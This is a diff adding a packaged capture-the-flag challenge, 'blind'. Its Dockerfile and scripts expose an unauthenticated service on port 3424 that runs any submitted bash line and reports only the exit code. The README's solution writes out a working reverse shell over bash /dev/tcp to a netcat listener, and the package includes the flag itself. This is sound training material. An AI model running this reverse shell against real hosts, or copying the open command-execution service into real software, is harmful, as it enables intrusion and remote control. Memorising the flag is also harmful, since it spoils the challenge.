@@ -1,0 +1,8 @@
+{
+    "Dockerfile": "FROM debian:buster-slim\n\nRUN apt update\nRUN apt install socat -y\n\nRUN mkdir /ctf\nCOPY start.sh /ctf/start.sh\nCOPY exec.sh /ctf/exec.sh\nCOPY flag.txt /ctf/flag.txt\n\nRUN useradd ctfuser -d /ctf\nRUN chown ctfuser:ctfuser /ctf/flag.txt\n\nEXPOSE 3424\n\nENTRYPOINT [\"bash\",\"/ctf/start.sh\"]",
+    "exec.sh": "#!/bin/bash\nprintf \"Execute: \"\nwhile read text;\ndo\n\tbash -c \"$text\" >/dev/null 2>&1;\n\techo $?;\n\tprintf \"Execute: \"\ndone",
+    "flag.txt": "gigem{r3v3r53_5h3ll5}",
+    "README.md": "# blind\n\n`nc <ip here> 3424`\n\n## Setup\n\n1. `docker build -t blind .`\n2. `docker run --rm -it -p 3424:3424 --read-only blind`\n\n## Brief Dev Description\n\nA script which will execute arbitrary bash but it'll only tell you the exit code.  Basically it's do you know that netcat exists (and bash /dev/tcp since netcat isn't installed on the server): the challenge.  \n\n## Solution\n\n1. make a netcat listener for your future reverse shell `nc -lvp 4444`\n2. run `/bin/bash -i > /dev/tcp/<internet accessible ip>/4444 0<&1 2>&1`\n3. run `cat flag.txt`",
+    "start.sh": "#!/bin/bash\n\nwhile : \ndo\n    su -c \"exec socat TCP-LISTEN:3424,reuseaddr,fork EXEC:/ctf/exec.sh,stderr\" - ctfuser;\ndone\n",
+    "category": "Misc"
+}
